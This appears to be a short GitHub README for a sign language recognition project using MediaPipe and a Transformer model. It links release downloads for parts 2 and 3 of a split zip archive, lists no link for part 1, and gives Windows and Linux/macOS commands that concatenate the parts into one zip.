# Sign Language Recognition System

Sign language recognition using **MediaPipe** and a **Transformer** model.

- [Part 2](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/sign-language-recognition-system.zip.part2)
- [Part 3](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/sign-language-recognition-system.zip.part3)

Download all three parts into the same folder, then join them in order. That rebuilds the original zip.

### Join on Windows

```bat
copy /b sign-language-recognition-system.zip.part1 + sign-language-recognition-system.zip.part2 + sign-language-recognition-system.zip.part3 sign-language-recognition-system.zip
```

### Join on Linux or macOS

```bash
cat sign-language-recognition-system.zip.part1 sign-language-recognition-system.zip.part2 sign-language-recognition-system.zip.part3 > sign-language-recognition-system.zip
```
